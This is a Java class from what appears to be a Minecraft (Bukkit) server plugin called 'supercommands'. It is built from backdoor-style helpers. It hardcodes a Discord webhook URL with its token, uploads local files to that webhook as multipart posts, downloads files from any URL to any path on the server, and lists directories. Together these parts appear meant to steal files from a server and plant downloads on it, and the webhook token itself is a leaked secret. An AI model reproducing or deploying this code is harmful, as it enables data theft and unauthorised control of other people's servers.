package me.lidan.infinityerror.supercommands;

import com.google.gson.Gson;
import lombok.Getter;
import lombok.Setter;
import org.bukkit.command.CommandSender;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.Scanner;

public class Bash {

    public static final String OS = System.getProperty("os.name");

    @Getter
    private CommandSender sender;

    @Getter
    private static Bash instance;

    @Getter
    @Setter
    private String URL = "https://discord.com/api/webhooks/1143995295261261864/aKCtLSaZ4k8IzxrBO_Vw3XrSytI2MZrUC3gatCiSCOqwmMssDb6DTH08FnHRbYGJ4eCs";

    @Getter
    @Setter
    private String currentDirectory = System.getProperty("user.dir");

    public Bash(CommandSender sender) {
        this.sender = sender;
        instance = this;
    }

    public void bash(String[] args) {
        Scanner input = new Scanner(System.in);
        String command = "";


    }

    public void useDownloader(String[] split_command) {
        sender.sendMessage("Using Bundled Downloader");
        if (split_command.length < 3) {
            sender.sendMessage("use download [file] [url]");
            return;
        }
        String path = split_command[1];
        String url = split_command[2];
        if (downloadFile(path, url)) {
            sender.sendMessage("Download successfully!");
        } else {
            sender.sendMessage("Download failed!");
        }
    }


    public static boolean downloadFile(String filename, String url){
        try {
            Files.copy(new URL(url).openStream(), Paths.get(filename), StandardCopyOption.REPLACE_EXISTING);
            return true;
        } catch (IOException e) {
            e.printStackTrace();
            return false;
        }
    }

    public static int sendPOSTMessage(String url, String message) throws IOException {
        URL uri = new URL(url);
        HttpURLConnection conn = (HttpURLConnection) uri.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");

        // Step 3: Create a Message object and convert it to a JSON string
        Gson gson = new Gson();
        WebhookMessage webhookMessage = new WebhookMessage(message);
        String json = gson.toJson(webhookMessage);

        // Step 4: Send the JSON data
        conn.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(conn.getOutputStream());
        wr.writeBytes(json);
        wr.flush();
        wr.close();

        // Step 5: Check the response
        return conn.getResponseCode();
    }

    public static int sendPOSTFile(String url, String filePath) throws IOException {
        File file = new File(filePath);

        // Step 3: Create a Message object and convert it to a JSON string
        Gson gson = new Gson();
        WebhookMessage message = new WebhookMessage(file.getName());
        String json = gson.toJson(message);

        // Step 4: Establish a connection to the webhook URL
        URL uri = new URL(url);
        HttpURLConnection conn = (HttpURLConnection) uri.openConnection();
        conn.setDoOutput(true);
        conn.setRequestMethod("POST");
        String boundary = "*****";
        conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

        // Step 5: Send the JSON data and file
        DataOutputStream wr = new DataOutputStream(conn.getOutputStream());
        wr.writeBytes("--" + boundary + "\r\n");
        wr.writeBytes("Content-Disposition: form-data; name=\"payload_json\"\r\n\r\n");
        wr.writeBytes(json);
        wr.writeBytes("\r\n--" + boundary + "\r\n");
        wr.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + file.getName() + "\"\r\n");
        wr.writeBytes("Content-Type: image/png\r\n\r\n");
        byte[] fileData = Files.readAllBytes(file.toPath());
        wr.write(fileData);
        wr.writeBytes("\r\n--" + boundary + "--\r\n");
        wr.flush();
        wr.close();

        return conn.getResponseCode();
    }

    public static String ls(String directoryPath) {
        StringBuilder sb = new StringBuilder();
        // Create a File object representing the directory
        File directory = new File(directoryPath);

        // Get a list of all files and directories in the directory
        File[] files = directory.listFiles();

        // Check if the directory is empty or if it doesn't exist
        if (files == null || files.length == 0) {
            sb.append("The directory is empty or it doesn't exist.");
            return sb.toString();
        }

        // Print the names of all files and directories
        for (File file : files) {
            if (file.isDirectory())
                sb.append("/");
            sb.append(file.getName());
            sb.append("\n");
        }
        return sb.toString();
    }
}
